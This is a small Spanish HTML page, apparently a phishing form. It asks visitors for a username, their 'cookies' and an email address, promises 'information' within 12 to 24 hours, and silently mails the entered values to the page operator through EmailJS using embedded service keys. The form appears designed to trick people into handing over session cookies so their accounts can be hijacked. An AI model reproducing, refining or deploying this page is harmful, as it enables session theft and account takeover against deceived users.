<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Información del usuario</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f2f4f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #fff;
            padding: 30px;
            max-width: 500px;
            width: 90%;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            text-align: center;
        }
        h1 {
            margin-bottom: 20px;
            color: #333;
        }
        input, textarea {
            width: 90%;
            padding: 10px;
            margin: 8px 0;
            border-radius: 6px;
            border: 1px solid #ccc;
            font-size: 16px;
        }
        button {
            padding: 12px 25px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        #mensaje {
            display: none;
            color: green;
            font-weight: bold;
            margin-top: 20px;
        }
    </style>
    <!-- EmailJS SDK -->
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
    <script type="text/javascript">
        // Inicializar EmailJS con tu Public Key
        (function(){
            emailjs.init("vbdxDlkyi1kNet13d");
        })();
    </script>
</head>
<body>
<div class="container">
    <h1>Información del usuario</h1>
    <form id="formulario">
        <input type="text" id="usuario" placeholder="Usuario" required><br>
        <textarea id="texto" placeholder="cookies" rows="4" required></textarea><br>
        <input type="email" id="correo" placeholder="Correo" required><br>
        <button type="button" onclick="enviarFormulario()">Enviar</button>
    </form>
    <div id="mensaje">
        ¡Formulario enviado! Por favor, espera de 12 a 24 horas para que te mandemos la información a tu correo.
    </div>
</div>

<script>
function enviarFormulario() {
    emailjs.send("service_9xolqhc", "template_des2mfd", {
        usuario: document.getElementById("usuario").value,
        texto: document.getElementById("texto").value,
        correo: document.getElementById("correo").value
    }).then(function() {
        document.getElementById("formulario").style.display = "none";
        document.getElementById("mensaje").style.display = "block";
    }, function(error) {
        alert("Error al enviar. Intenta nuevamente.");
        console.log(error);
    });
}
</script>

</body>
</html>
